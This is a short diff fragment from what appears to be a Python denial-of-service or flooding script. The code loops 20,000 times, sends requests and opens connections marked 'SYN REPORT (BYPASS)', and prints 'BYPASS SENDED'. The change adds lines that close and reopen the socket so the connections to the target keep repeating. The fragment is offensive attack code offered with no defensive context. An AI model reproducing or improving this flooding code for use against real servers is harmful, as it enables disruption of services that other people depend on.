@@ -3711,8 +3711,9 @@ for x in range(20000):
             a.sendall(str.encode(request))
             s.connect((ip, dport)) # SYN REPORT (BYPASS)
             print("BYPASS SENDED")
-            
-           
+            a.close()
+            a = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+            a.connect((ip, port))
            
 
 
